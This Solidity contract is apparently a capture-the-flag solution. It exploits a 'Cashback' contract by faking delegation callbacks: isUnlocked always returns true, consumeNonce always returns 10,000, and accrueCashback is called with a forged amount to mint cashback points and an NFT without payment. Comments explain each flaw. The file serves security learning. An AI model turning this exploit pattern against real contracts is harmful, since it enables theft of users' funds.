// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Currency} from "./Cashback.sol";
import {IERC1155} from "openzeppelin-contracts-v5.4.0/token/ERC1155/IERC1155.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";

import {console} from "forge-std/Test.sol";

interface ICashback {
    function accrueCashback(Currency currency, uint256 amount) external;
}

contract FreeDelegationLogic {
    uint256 public constant SUPERCASHBACK_NONCE = 10000;

    address public immutable cashback;
    address public immutable free;
    address public immutable player;
    address public immutable superCashbackNFT;

    constructor(address _cashback, address _free, address _player, address _superCashbackNFT) {
        cashback = _cashback;
        free = _free;
        player = _player;
        superCashbackNFT = _superCashbackNFT;
    }

    /**
     * @notice Exploits Cashback by minting the maximum FREE cashback without owning FREE tokens.
     *
     * @dev This function bypasses the normal payment flow and directly calls `accrueCashback`.
     *      - We pass a large `amount` (25,000 ether) so that:
     *            cashback = amount * rate / BASIS_POINTS = 25,000 * 2% = 500 ether (max)
     *      - Because the forged caller passes all the required checks
     *        (`onlyDelegatedToCashback`, `onlyUnlocked`, `onlyOnCashback`),
     *        Cashback mints ERC1155 cashback points to `address(this)`.
     *      - No real ERC20 FREE transfer happens: the contract trusts the input `amount`.
     *      - The minted cashback is initially owned by this contract (the forged caller),
     *        so we transfer it to the player.
     *
     * @custom:insight The core vulnerability is that `accrueCashback` relies on the input
     *                 amount without verifying that an actual token transfer occurred.
     */
    function attackFreeCashback() external {
        ICashback(cashback).accrueCashback(Currency.wrap(free), 25_000 ether);

        uint256 freeId = Currency.wrap(free).toId();

        uint256 balance = IERC1155(cashback).balanceOf(address(this), freeId);

        IERC1155(cashback).safeTransferFrom(address(this), player, freeId, balance, "");

        IERC721(superCashbackNFT).transferFrom(address(this), player, uint256(uint160(address(this))));
    }

    /**
     * @notice Bypasses the `onlyUnlocked` modifier in Cashback.
     *
     * @dev Cashback checks:
     *      `Cashback(payable(msg.sender)).isUnlocked()`
     *      to ensure the caller is in an "unlocked" state.
     *
     *      By always returning `true`, this contract tricks Cashback into
     *      believing the caller is unlocked, even though no real unlock
     *      mechanism (transient storage) was used.
     *
     * @custom:insight This works because Cashback trusts an external call
     *                 to `msg.sender` instead of enforcing the state internally.
     */
    function isUnlocked() external pure returns (bool) {
        return true;
    }

    /**
     * @notice Forces Cashback to mint the Super Cashback NFT.
     *
     * @dev Cashback calls:
     *      `Cashback(payable(msg.sender)).consumeNonce()`
     *      and expects a monotonically increasing nonce.
     *
     *      By always returning `10_000`, we directly satisfy the condition:
     *          `if (newNonce == 10_000)`
     *      which triggers the NFT mint without performing 10,000 real operations.
     *
     * @custom:insight The contract does not verify that the nonce is actually
     *                 stored or incremented, allowing full control over its value.
     */
    function consumeNonce() external pure returns (uint256) {
        return SUPERCASHBACK_NONCE;
    }
}
